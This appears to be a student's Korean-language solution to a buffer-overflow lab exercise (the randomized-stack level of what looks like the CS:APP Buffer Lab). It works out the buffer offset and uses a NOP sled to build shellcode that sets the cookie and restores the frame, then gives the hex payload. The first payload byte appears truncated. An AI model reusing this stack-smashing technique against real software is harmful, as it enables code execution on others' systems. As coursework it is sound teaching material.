test()상: old
getbuf()상: new

old ebp	new ebp	old esp	new esp
0x556833a0	0x55683370	0x55683378	0x55683158
0x556833c0	0x55683390	0x55683398	0x55683178
0x556833e0	0x556833b0	0x556833b8	0x55683198
0x55683380	0x55683350	0x55683358	0x55683138
0x55683370	0x55683340	0x55683348	0x55683128

buf = ebp-0x208 = ebp-520

cookie = 0x7220cc64
----------------------------------
넣어야 하는 문자열의 길이
= buf 시작(program이 심어져있음) ~ ebp ~ return(to somewhere of buf)
= 520+4+4
= 528
-----------------------------------

일단 ret를 건드리면, ret 안의 주소로 이동한다.
그런데 randomized stack이라 ret 안의 주소를 특정할 방법이 없다.
(매번 달라진다)

따라서 520byte에 프로그램을 심어 놓고 buf 중 한 곳으로 ret한 후
nop sled(0x90)를 통해 쭉 미끄러지다가
우리의 program이 실행되도록 한다.

buf 중 한 곳은 0x556831a8로 대략 잡았다.
이 때 여기는 항상 심어 놓은 program의 위치보다 낮은 곳에 있어
언제든지 program이 작동해야 한다.

-----------------------------------
프로그램은 아래와 같다.

먼저 getbufn()상에서 ebp가 오염되었기 때문에 ebp를 새로 만든다.
원래는 leave와 ret을 건드린 후면 testn() 상의 ebp와 esp가 있어야 한다.
esp는 오염되지 않았는데, testn() 코드를 보면 ebp는 esp보다 0x28 높은 곳에 있다.
따라서 lea    0x28(%esp),%ebp 해준다.

그리고 eax에 cookie값을 넣고,

testn()에서 돌아가야 하는 위치인 0x08048c77를 push하고

ret한다.

프로그램이 다 돌아가면 정상적인 ebp와 함께 cookie를 ret하게 된다.

0:   	8d 6c 24 28            	lea    0x28(%esp),%ebp
4:   	b8 64 cc 20 72          	mov    $0x7220cc64,%eax
9:   	68 77 8c 04 08          	push   $0x8048c77
e:   	c3                      	ret
-----------------------------------

d 6c 24 28 b8 64 cc 20 72 68 77 8c 04 08 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 a8 31 68 55